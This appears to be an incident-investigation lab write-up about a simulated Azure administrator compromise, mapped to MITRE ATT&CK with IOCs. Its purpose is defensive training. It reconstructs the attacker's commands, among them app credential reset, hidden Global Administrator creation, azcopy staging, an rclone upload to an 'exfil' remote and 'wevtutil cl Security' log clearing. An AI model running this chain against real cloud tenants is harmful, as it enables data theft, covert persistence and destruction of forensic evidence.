# ☁️ Investigation 13 – Cloud Account Compromise & Cloud Data Exfiltration

## 📌 Scenario

A Cloud Administrator account (`admin.cloud`) was compromised, allowing an attacker to authenticate into the Azure environment using Azure CLI. The attacker performed cloud reconnaissance, reset application credentials, created a hidden Global Administrator account, accessed sensitive Azure Blob Storage, staged and compressed finance-related files, exfiltrated them to attacker-controlled cloud storage using Rclone, and finally removed evidence by deleting archives and clearing Windows Security Event Logs.

---

# 🎯 Investigation Objectives

- Investigate Azure CLI activity
- Detect Cloud Administrator compromise
- Analyze Azure Active Directory enumeration
- Detect cloud privilege escalation
- Investigate Azure Storage access
- Analyze cloud data staging
- Detect cloud data exfiltration
- Identify persistence mechanisms
- Detect anti-forensics activity
- Map attacker actions to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **29** |
| Hostname | **CLOUD-ADMIN01** |
| Compromised User | **admin.cloud** |
| Incident Severity | 🔴 Critical |
| Attack Type | Cloud Account Compromise & Data Exfiltration |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
| 4624 | Successful Logon | 2 |
| 4625 | Failed Logon | 1 |
| 4634 | Logoff | 1 |
| 4663 | Object Access | 2 |
| 4672 | Special Privileges Assigned | 1 |
| 4688 | Process Creation | 19 |
| 4720 | User Account Created | 1 |
| 4732 | User Added to Privileged Group | 1 |
| 5156 | Allowed Network Connection | 1 |

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
| 🔴 Critical | 9 |
| 🟠 High | 11 |
| 🟡 Medium | 3 |
| 🟢 Low | 6 |

---

# 👤 Most Active User

| User | Events |
|------|-------:|
| **admin.cloud** | **26** |

The majority of malicious activity originated from the compromised **Cloud Administrator** account.

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Access

- Successful logon using Cloud Administrator account.
- Administrative privileges assigned.

---

## Phase 2 – Reconnaissance

### Commands Executed

```cmd
whoami /all
hostname
ipconfig /all
```

### Purpose

- Identify current user
- Verify privilege level
- Identify hostname
- Collect network configuration
- Understand the cloud environment

---

## Phase 3 – Azure Authentication

### Command

```bash
az login --use-device-code
```

### Findings

The attacker authenticated to the Azure tenant using Azure CLI and the compromised administrator account.

---

## Phase 4 – Cloud Enumeration

### Commands

```bash
az account list
az ad user list
az role assignment list --all
```

### Findings

The attacker enumerated:

- Azure subscriptions
- Azure Active Directory users
- Role assignments
- Administrative permissions

This helped identify valuable cloud resources and privileged accounts.

---

## Phase 5 – Cloud Persistence

### Reset Azure Application Credentials

```bash
az ad app credential reset --id cloud-backup-app
```

The attacker reset the credentials of an Azure application to establish persistent access.

---

### Create Hidden Administrator

```text
Created user:

support.sync@corp.local
```

The attacker created a new account designed to appear legitimate.

---

### Privilege Escalation

```text
support.sync added to Global Administrator
```

The newly created account received Global Administrator privileges, ensuring persistent control of the Azure environment.

---

## Phase 6 – Azure Storage Enumeration

### Command

```bash
azcopy list https://storagecorp.blob.core.windows.net/finance
```

### Findings

The attacker enumerated Azure Blob Storage and identified sensitive financial data.

---

## Phase 7 – Sensitive File Access

Files accessed:

- payroll_2026.xlsx
- employee_records.csv

These files likely contain financial and employee information.

---

## Phase 8 – Data Staging

### Command

```bash
azcopy copy https://storagecorp.blob.core.windows.net/finance C:\Users\Public\cloud_staging --recursive
```

The attacker copied all finance files from Azure Blob Storage to a local staging directory.

---

## Phase 9 – Archive Creation

### Command

```bash
7z.exe a C:\Users\Public\cloud_data.7z C:\Users\Public\cloud_staging\*
```

All staged files were compressed into a single archive to simplify exfiltration.

---

## Phase 10 – Cloud Data Exfiltration

### Commands

```bash
rclone config create exfil remote
```

```bash
rclone copy C:\Users\Public\cloud_data.7z exfil:stolen-data
```

The attacker uploaded the archive to an attacker-controlled cloud storage service using Rclone.

---

## Phase 11 – Cleanup

### Command

```cmd
cmd.exe /c del C:\Users\Public\cloud_data.7z
```

The archive was deleted after successful exfiltration to remove evidence.

---

## Phase 12 – Anti-Forensics

### Command

```cmd
wevtutil cl Security
```

The Windows Security Event Logs were cleared to hinder forensic analysis.

---

# ☁️ Complete Attack Timeline

```text
Successful Cloud Administrator Logon
            │
Reconnaissance
            │
Azure Login
            │
Cloud Enumeration
            │
Credential Reset
            │
Create Hidden Administrator
            │
Assign Global Administrator
            │
Azure Storage Enumeration
            │
Sensitive File Access
            │
Data Staging
            │
Archive Creation
            │
Cloud Data Exfiltration
            │
Cleanup
            │
Clear Windows Security Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| Valid Accounts | T1078 |
| System Owner/User Discovery | T1033 |
| System Information Discovery | T1082 |
| System Network Configuration Discovery | T1016 |
| Account Discovery | T1087 |
| Permission Groups Discovery | T1069 |
| Account Manipulation | T1098 |
| Create Account | T1136 |
| Data from Local System | T1005 |
| Local Data Staging | T1074.001 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Web Service | T1567 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Host

- CLOUD-ADMIN01

## Users

- admin.cloud
- support.sync

## External IP Addresses

- 203.0.113.45
- 198.51.100.77

## Suspicious Processes

- az.exe
- azcopy.exe
- rclone.exe
- cloudtool.exe
- curl.exe
- powershell.exe
- 7z.exe
- cmd.exe
- wevtutil.exe

## Suspicious Files

- cloudtool.exe
- cloud_data.7z
- payroll_2026.xlsx
- employee_records.csv

## Azure Resources

- cloud-backup-app
- Finance Blob Storage Container

---

# 🚨 Incident Conclusion

The investigation revealed a complete cloud-focused attack in which the attacker compromised a Cloud Administrator account and authenticated to Azure using Azure CLI. After performing cloud reconnaissance, the attacker reset Azure application credentials, created a hidden Global Administrator account (`support.sync`), and established long-term persistence.

The attacker then enumerated Azure Blob Storage, copied sensitive finance data to a local staging directory, compressed the files into an archive, and exfiltrated the data to attacker-controlled cloud storage using Rclone. Finally, the attacker deleted the archive and cleared Windows Security Event Logs to remove forensic evidence and delay incident response.

**Final Incident Severity:** 🔴 **Critical**

---

# 🛠️ Skills Demonstrated

- Splunk SIEM Investigation
- Cloud Incident Response
- Azure CLI Analysis
- Azure Active Directory Investigation
- Azure Storage Investigation
- Threat Hunting
- Windows Event Log Analysis
- MITRE ATT&CK Mapping
- IOC Identification
- Cloud Persistence Detection
- Cloud Data Exfiltration Analysis
- Anti-Forensics Investigation

---

## ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐ (Advanced Cloud Investigation)
